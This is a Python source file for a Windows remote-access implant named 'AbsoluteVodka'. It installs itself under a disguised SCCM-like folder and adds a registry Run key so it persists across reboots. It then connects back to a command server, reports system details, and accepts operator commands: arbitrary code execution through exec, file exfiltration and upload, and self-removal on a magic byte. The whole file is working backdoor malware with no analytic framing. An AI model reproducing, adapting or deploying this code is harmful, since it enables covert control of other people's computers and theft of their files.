# AbsoluteVodka Win64_ABservice

import base64
import platform
import socket
import os
import struct
import tempfile
import random
import string
import sys
import shutil
import subprocess
from time import sleep


class Persistence:
    def __init__(self):
        self.SERVICE_NAME = "Win64_ABservice"

        if getattr(sys, 'frozen', False):
            self.EXECUTABLE_PATH = sys.executable
        elif __file__:
            self.EXECUTABLE_PATH = __file__
        else:
            EXECUTABLE_PATH = ''
        self.EXECUTABLE_NAME = os.path.basename(self.EXECUTABLE_PATH)
        self.INSTALL_DIRECTORY = "C:\\WINDOWS\\ccmcache\\64" + "\\"

    def install(self):
        if not self.is_installed():
            try:
                if not os.path.exists(self.INSTALL_DIRECTORY):
                    try:
                        os.makedirs(self.INSTALL_DIRECTORY)
                    except Exception, e:
                        ReverseTCP.PrintDebug(ReverseTCP(), 'PersistenceError -> ' + str(e))
                        self.INSTALL_DIRECTORY = os.environ["TEMP"] + "\\64" + "\\"
                        os.makedirs(self.INSTALL_DIRECTORY)

                shutil.copyfile(self.EXECUTABLE_PATH, self.INSTALL_DIRECTORY + self.EXECUTABLE_NAME)

                stdin, stdout, stderr = os.popen3(
                    "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (
                        self.SERVICE_NAME, self.INSTALL_DIRECTORY + self.EXECUTABLE_NAME))
                return True
            except Exception, e:
                return str(e)
        else:
            return True

    def is_installed(self):
        output = os.popen(
            "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % self.SERVICE_NAME)
        if self.SERVICE_NAME in output.read():
            return True
        else:
            return False

    def clean(self):
        try:
            subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % self.SERVICE_NAME,
                             shell=True)
            subprocess.Popen(
                "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (
                    self.SERVICE_NAME, "\"cmd.exe /c del %s\\" % self.EXECUTABLE_PATH + "\""),
                shell=True)
            return True
        except Exception, e:
            return str(e)


class InformationGathering:
    def __init__(self):
        pass

    @staticmethod
    def OsName():
        return platform.system() + " " + platform.release()

    @staticmethod
    def Arch():
        return platform.architecture()[0]

    @staticmethod
    def Screenshot():
        pass


class ReverseTCP:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 9876
        self.buffer = 1024 * 24
        self.spl = ':' * 5
        self.socket = None
        self.debug = True
        self.reconnectionDelay = 5  # s
        self.implantName = '0x' + 'EP01'
        self.uninstall = False

    @staticmethod
    def download_file(filename):
        try:
            f = open(filename, 'rb')
            content = f.read()
            return content
        except Exception, e:
            return str(e)

    def send_msg(self, msg):
        msg = base64.b64encode(msg)
        msg = struct.pack('>I', len(msg)) + msg
        self.socket.sendall(msg)

    def recv_msg(self):
        # Read message length and unpack it into an integer
        raw_msglen = ReverseTCP.recvall(self.socket, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return base64.b64decode(ReverseTCP.recvall(self.socket, msglen))

    @staticmethod
    def recvall(sock, n):
        # Helper function to recv n bytes or return None if EOF is hit
        data = b''
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def PrintDebug(self, string):
        if self.debug:
            print string

    def InitializeSocket(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            self.PrintDebug('InitializeSocket [Error] -> %s' % str(e))

    def SocketConnection(self):
        try:
            self.socket.connect((self.host, self.port))
        except socket.error as e:
            self.PrintDebug('SocketConnection.Callback [Error] -> %s' % str(e))
            sleep(5)
            raise
        try:
            self.send_msg(
                self.implantName + self.spl + InformationGathering.OsName() + self.spl + InformationGathering.Arch())
        except socket.error as e:
            self.PrintDebug('SocketConnection.CallbackIG [Error] -> %s' % str(e))
            raise
        return

    def DataParsing(self, data):
        data = base64.b64decode(data)
        if '+' * 5 in data:
            try:
                cmd = data.split('+' * 5)[1]
                exec cmd
                returnvalue = run()  # Output
                self.send_msg(returnvalue)
            except Exception as e:
                self.send_msg(str(e))
        elif data.startswith('download '):
            try:
                filename = data.split(' ')[1]
                if os.path.isfile(filename):
                    self.send_msg('\x11')
                    confirm = self.recv_msg()
                    if confirm == '\x13':
                        self.send_msg(self.download_file(filename))
                else:
                    self.send_msg('\x12')
            except ValueError:
                self.send_msg('Error: expecting filename.')
        elif data.startswith('upload '):
            try:
                filename = data.split(' ')[1]
                self.send_msg('\x11')
                body = self.recv_msg()
                if body == '\x12':
                    return
                else:
                    f = open(filename, 'wb')
                    f.write(body)
                    f.close()
                    self.send_msg('\x13')
            except Exception, e:
                self.send_msg(str(e))
            except ValueError:
                self.send_msg('Error: expecting filename.')
        elif data == 'screenshot':
            filename = InformationGathering.Screenshot()
            if not 'Error:' in filename:
                try:
                    if os.path.isfile(filename):
                        self.send_msg('\x11')
                        confirm = self.recv_msg()
                        if confirm == '\x13':
                            self.send_msg(self.download_file(filename))
                            os.remove(filename)
                    else:
                        self.send_msg('\x12')
                except ValueError:
                    self.send_msg('Error: expecting filename.')
            else:
                self.send_msg(filename)
        elif data.startswith('persistence '):
            try:
                _, argument = data.split(' ')
                if argument == "install":
                    prss = Persistence()
                    output = prss.is_installed()
                    if output:
                        self.send_msg('* Persistence is already installed on the system.')
                    else:
                        output = prss.install()
                        if output:
                            self.send_msg('+ Persistence successfully installed.')
                        else:
                            self.send_msg('- ' + str(output))
                elif argument == "remove":
                    prss = Persistence()
                    output = prss.is_installed()
                    if not output:
                        self.send_msg('* Persistence is already removed from the system.')
                    else:
                        output = prss.clean()
                        if output:
                            self.send_msg('+ Persistence successfully removed.')
                        else:
                            self.send_msg('- ' + str(output))
                elif argument == "status":
                    prss = Persistence()
                    output = prss.is_installed()
                    if output:
                        self.send_msg('+ Persistence is installed on the system.')
                    else:
                        self.send_msg('- Persistence is not installed on the system.')
            except Exception, e:
                self.send_msg(str(e))
            except ValueError:
                self.send_msg('- Error: expecting argument.')

        else:
            self.send_msg('- Unrecognized command.')

    def CommandHandling(self):
        while True:
            try:
                data = self.recv_msg()
                if data != '\x06':
                    if data == '\x10':
                        break
                    elif data == '\x11':
                        break
                    elif data == '\x07':
                        self.send_msg('\x08')
                    elif data == '\x99':
                        # Magic Byte
                        prss = Persistence()
                        prss.clean()
                        self.send_msg('\x90')
                        self.socket.close()
                        self.uninstall = True
                        break
                    else:
                        self.DataParsing(data)
                else:
                    self.send_msg('\x07')
            except socket.error as e:
                self.PrintDebug('SocketConnection.CallbackComm [Error] -> %s' % str(e))
                break
            except Exception, e:
                self.PrintDebug('SocketConnection.UnhandledException [Error] -> %s' % str(e))
        self.socket.close()
        return

    def DormantHandler(self):
        while True:
            if self.uninstall:
                break
            try:
                data = self.recv_msg()
                if data == '\x06':
                    self.send_msg('\x07')
                    self.CommandHandling()
                elif data == '\x07':
                    self.send_msg('\x08')
                elif data == '\x11':
                    break
            except socket.error as e:
                self.PrintDebug('SocketConnection.DormantHandler [Error] -> %s' % str(e))
                break


def ConnectionHandler(rTCPv):
    while True:
        try:
            rTCPv.SocketConnection()
        except Exception, e:
            rTCPv.PrintDebug('ConnectionHandler [Error] -> %s' % str(e))
        else:
            break


def CommandHandler(rTCPv):
    try:
        rTCPv.DormantHandler()
        return True
    except Exception, e:
        rTCPv.PrintDebug('CommandHandler [Error] -> %s' % str(e))
    rTCPv.socket.close()
    return False


if __name__ == '__main__':
    prs = Persistence()
    prs.install()
    while True:
        rTCP = ReverseTCP()
        rTCP.InitializeSocket()
        ConnectionHandler(rTCP)
        if CommandHandler(rTCP):
            break
